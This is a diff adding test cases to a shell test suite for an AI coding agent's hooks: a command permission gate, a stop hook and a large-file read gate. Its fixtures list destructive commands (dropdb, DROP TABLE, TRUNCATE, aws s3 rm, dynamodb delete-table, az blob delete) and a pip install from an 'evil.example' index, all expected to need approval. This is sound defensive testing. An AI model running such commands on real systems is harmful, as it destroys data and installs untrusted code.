@@ -92,6 +92,27 @@ ask|gh workflow run deploy-generic.yml
 ask|gh workflow enable ci.yml
 ask|gh api -X DELETE repos/x/y/git/refs/heads/z
 ask|gh api repos/x/y/issues --method POST -f t=x
+# gh api writes without -X: a field (-f/-F/--field/--raw-field) or --input makes it a POST (#251)
+ask|gh api repos/x/y/issues -f title=x
+ask|gh api repos/x/y/git/refs --input ref.json
+ask|gh api repos/x/y/labels -F name=bug --raw-field color=f00
+ask|gh api graphql -f query='mutation { addComment(input:{}) { clientMutationId } }'
+# --- databases (#251; ported from enrichmeai.github.io) ---
+ask|psql "host=10.0.0.5 dbname=culvert user=culvert" -c "select 1"
+ask|pg_restore -d culvert dump.sql
+ask|dropdb culvert
+ask|liquibase update
+ask|psql
+ask|cat dump.sql | psql
+ask|az
+ask|python3 -c "conn.execute('DROP TABLE job_control.stage_claims')"
+ask|sqlite3 x.db "delete from t"
+ask|python3 -c "c.execute('TRUNCATE TABLE job_control.pipeline_jobs')"
+# --- other clouds' CLIs: the AWS and Azure adapters reach real accounts (#251) ---
+ask|aws s3 rm s3://b/k
+ask|aws dynamodb delete-table --table-name t
+ask|/usr/local/bin/aws athena start-query-execution --query-string x
+ask|az storage blob delete -c x -n y
 ask|pip install -e git+https://example.com/x.git#egg=x
 ask|pip install --index-url https://evil.example/simple x
 # --- must stay silent ---
@@ -117,6 +138,13 @@ pass|terraform plan
 pass|helm template x infrastructure/k8s/charts/airflow
 pass|gh pr view 12
 pass|gh api repos/x/y/pulls
+pass|gh api repos/x/y/pulls --jq '.[].number'
+pass|gh api graphql -f query='query { viewer { login } }'
+pass|gh api repos/o/r/contents | xargs ls -f
+pass|gh api -X GET search/issues -f q=repo:x/y
+pass|grep -rn "DROP TABLE" deployments
+pass|git log --grep "delete from"
+pass|grep -rn "aws s3" docs
 pass|pip install -e 'data-pipeline-libraries/data-pipeline-core[test]'
 pass|python -m pytest data-pipeline-libraries/data-pipeline-core/tests -q
 pass|flake8 data-pipeline-libraries
@@ -145,6 +173,9 @@ expect 0 "$(pe "$ptmp/pom.xml")" 'post-edit good pom.xml'
 expect 2 "$(pe "$ptmp/m/pom.xml")" 'post-edit bad pom.xml'
 expect 0 "$(pe "$ptmp/chart/templates/x.yaml")" 'post-edit helm template is not YAML'
 expect 2 "$(pe "$ptmp/dir with space/bad.json")" 'post-edit path with spaces'
+printf 'echo hi\n' > "$ptmp/good.sh"; printf 'if then\n' > "$ptmp/bad.sh"
+expect 0 "$(pe "$ptmp/good.sh")" 'post-edit good.sh'
+expect 2 "$(pe "$ptmp/bad.sh")" 'post-edit bad.sh (bash -n, #251)'
 expect 0 "$(pe "$ptmp/missing.json")" 'post-edit deleted file'
 expect 0 "$(pe "")" 'post-edit no file_path'
 if python3 -c 'import yaml' 2>/dev/null; then
@@ -169,6 +200,79 @@ if python3 -m pytest --version >/dev/null 2>&1; then
   out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
   expect "" "$out" 'stop hook silent once the package is green'
 fi
+
+# stop-fast-gates (#251): a change under .claude/hooks runs the hook tests; failing ones block the stop.
+mkdir -p "$tmp/.claude/hooks"
+printf '#!/usr/bin/env bash\necho "FAIL: a fixture"; exit 1\n' > "$tmp/.claude/hooks/test-hooks.sh"; chmod +x "$tmp/.claude/hooks/test-hooks.sh"
+out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
+expect "block|yes" "$(jq -r '[.decision, (.reason | test("test-hooks.sh failed") | if . then "yes" else "no" end)] | join("|")' <<<"$out" 2>/dev/null)" 'stop hook runs the hook tests when .claude/hooks changes'
+printf '#!/usr/bin/env bash\nexit 0\n' > "$tmp/.claude/hooks/test-hooks.sh"
+out=$(echo '{"stop_hook_active":false}' | (cd "$tmp" && CLAUDE_PROJECT_DIR="$tmp" "$here/stop-fast-gates.sh"))
+expect "" "$out" 'stop hook silent once the hook tests pass'
+rm -rf "$tmp/.claude" "$tmp/pkg"
+
+# stop-fast-gates (#251): changed Java with no mvn on PATH is reported as NOT RUN, never passed or skipped.
+jtmp=$(mktemp -d); trap 'rm -rf "$tmp" "$ptmp" "$jtmp"' EXIT
+git -C "$jtmp" init -q -b feature 2>/dev/null || { git -C "$jtmp" init -q && git -C "$jtmp" checkout -q -b feature; }
+git -C "$jtmp" -c user.email=t@t -c user.name=t commit -q --allow-empty -m init
+mkdir -p "$jtmp/mod/src"; printf '<project/>\n' > "$jtmp/pom.xml"; printf '<project/>\n' > "$jtmp/mod/pom.xml"
+printf 'class A {}\n' > "$jtmp/mod/src/A.java"
+nomvn=$(printf '%s' "$PATH" | tr ':' '\n' | while read -r d; do [ -x "$d/mvn" ] || printf '%s:' "$d"; done)
+if PATH="$nomvn" command -v git >/dev/null && PATH="$nomvn" command -v jq >/dev/null && ! PATH="$nomvn" command -v mvn >/dev/null; then
+  out=$(echo '{"stop_hook_active":false}' | (cd "$jtmp" && PATH="$nomvn" CLAUDE_PROJECT_DIR="$jtmp" "$here/stop-fast-gates.sh"))
+  expect "yes" "$(jq -r '.systemMessage // "" | test("did NOT run") | if . then "yes" else "no" end' <<<"$out" 2>/dev/null)" 'stop hook: Java changed, mvn missing -> reported as not run'
+else
+  echo "SKIPPED: mvn shares a directory with git or jq here, so the no-mvn case cannot be staged"
+fi
+
+# read-gate (#251; ported from enrichmeai.github.io PR #52): a whole read of a text file over the limit
+# is denied with a pointer to a slice or a search; a slice, a small file, a binary, a missing file and
+# a piped cat all pass.
+rg() { # $1 = tool, $2 = JSON tool_input -> "deny" or "pass"
+  local out
+  out=$(jq -n --arg t "$1" --argjson i "$2" --arg d "$tmp" '{tool_name:$t, tool_input:$i, cwd:$d}' \
+    | (cd "$tmp" && CLAUDE_READ_GATE_LINES=350 "$here/read-gate.sh" 2>/dev/null))
+  [ "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" = "deny" ] && echo deny || echo pass
+}
+seq 1 400 > "$tmp/big.txt"; seq 1 350 > "$tmp/edge.txt"; seq 1 20 > "$tmp/small.txt"
+head -c 20000 /dev/urandom > "$tmp/blob.bin"; mkdir -p "$tmp/d s"; seq 1 400 > "$tmp/d s/big.md"
+expect deny "$(rg Read "{\"file_path\":\"$tmp/big.txt\"}")" 'read-gate: whole read of 400 lines'
+expect deny "$(rg Read '{"file_path":"big.txt"}')" 'read-gate: relative path, resolved from cwd'
+expect deny "$(rg Read "{\"file_path\":\"$tmp/d s/big.md\"}")" 'read-gate: path with a space'
+expect pass "$(rg Read "{\"file_path\":\"$tmp/edge.txt\"}")" 'read-gate: exactly the limit'
+expect pass "$(rg Read "{\"file_path\":\"$tmp/small.txt\"}")" 'read-gate: small file'
+expect pass "$(rg Read "{\"file_path\":\"$tmp/big.txt\",\"offset\":100,\"limit\":50}")" 'read-gate: a slice'
+expect pass "$(rg Read "{\"file_path\":\"$tmp/big.txt\",\"limit\":200}")" 'read-gate: limit alone'
+expect pass "$(rg Read "{\"file_path\":\"$tmp/big.txt\",\"offset\":300}")" 'read-gate: offset alone'
+expect pass "$(rg Read "{\"file_path\":\"$tmp/blob.bin\"}")" 'read-gate: binary file'
+expect pass "$(rg Read "{\"file_path\":\"$tmp/missing.txt\"}")" 'read-gate: missing file'
+expect deny "$(rg Bash "{\"command\":\"cat $tmp/big.txt\"}")" 'read-gate: cat of a big file'
+expect deny "$(rg Bash '{"command":"cat big.txt"}')" 'read-gate: cat, relative path'
+expect pass "$(rg Bash "{\"command\":\"cat $tmp/big.txt | grep 7\"}")" 'read-gate: cat piped into a filter'
+expect pass "$(rg Bash "{\"command\":\"cat $tmp/big.txt > $tmp/copy.txt\"}")" 'read-gate: cat redirected'
+expect pass "$(rg Bash "{\"command\":\"cat $tmp/small.txt\"}")" 'read-gate: cat of a small file'
+expect pass "$(rg Bash "{\"command\":\"head -n 50 $tmp/big.txt\"}")" 'read-gate: head is bounded'
+expect pass "$(rg Bash "{\"command\":\"sed -n '1,50p' $tmp/big.txt\"}")" 'read-gate: sed slice'
+expect pass "$(rg Bash '{"command":"git status"}')" 'read-gate: unrelated command'
+expect pass "$(rg Edit "{\"file_path\":\"$tmp/big.txt\"}")" 'read-gate: another tool is not its business'
+# the payload's cwd decides a relative path, not the directory the hook runs in
+out=$(jq -n --arg d "$tmp" '{tool_name:"Read", tool_input:{file_path:"big.txt"}, cwd:$d}' | (cd / && "$here/read-gate.sh" 2>/dev/null))
+expect deny "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" 'read-gate: relative path from the payload cwd'
+# the whole deny object, in the form the hooks docs specify (exit 0, hookSpecificOutput)
+out=$(jq -n --arg f "$tmp/big.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | "$here/read-gate.sh" 2>/dev/null); rc=$?
+expect "0|PreToolUse|deny|yes" "$rc|$(jq -r '[.hookSpecificOutput.hookEventName, .hookSpecificOutput.permissionDecision, (.hookSpecificOutput.permissionDecisionReason | test("400 lines.*offset and limit.*grep -n") | if . then "yes" else "no" end)] | join("|")' <<<"$out" 2>/dev/null)" 'read-gate: exit 0 with the deny object and a reason naming a slice and grep -n'
+expect deny "$(rg Bash "$(jq -n --arg c "cat -n \"$tmp/d s/big.md\"" '{command:$c}')")" 'read-gate: cat -n of a quoted path'
+expect deny "$(rg Bash "{\"command\":\"cat -- $tmp/big.txt\"}")" 'read-gate: cat -- file'
+printf '%s' "$(seq 1 351)" > "$tmp/nonl.txt"
+expect deny "$(rg Read "{\"file_path\":\"$tmp/nonl.txt\"}")" 'read-gate: 351 lines, no final newline'
+out=$(jq -n --arg f "$tmp/small.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | CLAUDE_READ_GATE_LINES=10 "$here/read-gate.sh" 2>/dev/null)
+expect deny "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" 'read-gate: CLAUDE_READ_GATE_LINES moves the limit'
+out=$(jq -n --arg f "$tmp/big.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | CLAUDE_READ_GATE_LINES=lots "$here/read-gate.sh" 2>&1)
+expect "deny" "$(jq -r '.hookSpecificOutput.permissionDecision // empty' <<<"$out" 2>/dev/null)" 'read-gate: a non-numeric CLAUDE_READ_GATE_LINES falls back to 350, with no shell error'
+expect "0:" "$(printf 'not json' | "$here/read-gate.sh" >/dev/null 2>&1; echo "$?:")" 'read-gate: garbage input passes silently'
+out=$(jq -n --arg f "$tmp/big.txt" '{tool_name:"Read", tool_input:{file_path:$f}}' | CLAUDE_SKIP_READ_GATE=1 "$here/read-gate.sh" 2>/dev/null)
+expect "" "$out" 'read-gate: CLAUDE_SKIP_READ_GATE=1 turns it off'
+rm -rf "$tmp/big.txt" "$tmp/edge.txt" "$tmp/small.txt" "$tmp/blob.bin" "$tmp/d s" "$tmp/nonl.txt" "$tmp/copy.txt"
 
 echo "hook tests: $n run, $([ $fail = 0 ] && echo 'all passed' || echo 'FAILURES above')"
 exit $fail
